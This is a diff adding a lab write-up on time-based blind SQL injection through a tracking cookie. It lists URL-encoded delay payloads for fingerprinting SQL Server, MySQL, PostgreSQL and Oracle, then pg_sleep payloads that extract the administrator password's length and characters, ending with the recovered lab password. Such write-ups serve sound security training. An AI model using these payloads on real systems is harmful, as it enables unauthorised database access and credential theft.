@@ -1,0 +1,83 @@
+Lab #2 - Blind SQL injection with time delays and information retrieval
+
+Vulnerability - This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+                The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+Goal - The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+        To solve the lab, log in as the administrator user.
+
+Analysis:
+1. Check the type of database being used:
+- MICROSOFT SQL SERVER: '%3b+IF(1=1)+WAITFOR+DELAY+'0:0:10'+-- => FALSE
+- MySQL: '%3bSELECT+IF(1=1, SLEEP(5), 0)%20+-- => FALSE
+- PostgreSQL: '%3b+SELECT+CASE+WHEN(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--=> TRUE
+- Oracle: '%3bSELECT+CASE+WHEN(1=1)+THEN+DB_PIPE.RECEIVE_MESSAGE('a',10)+ELSE+NULL+END+FROM+dual--=> FALSE
+=> The type of database is PostgreSQL
+
+2. Using Burp Intruder to check the length of the password of administrator:
+'%3b+SELECT+CASE+WHEN+((SELECT+LENGTH(password)+FROM users+WHERE+username='administrator')=$1$)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+--
+=> length of password is 20
+
+3. Using Burp Intruder to check every character of the password of administrator:
+'%3b+SELECT+CASE+WHEN+((SELECT+SUBSTRING(password, $1$, 1)+FROM users+WHERE+username='administrator')='$z$')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+--
+
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+
+character:
+=> 1. l
+=> 2. c
+=> 3. x
+=> 4. b
+=> 5. e
+=> 6. 2
+=> 7. 0
+=> 8. b
+=> 9. x
+=> 10. w
+=> 11. u
+=> 12. 9
+=> 13. z
+=> 14. k
+=> 15. n
+=> 16. g
+=> 17. x
+=> 18. c
+=> 19. v
+=> 20. y
+
+=> password: lcxbe20bxwu9zkngxcvy
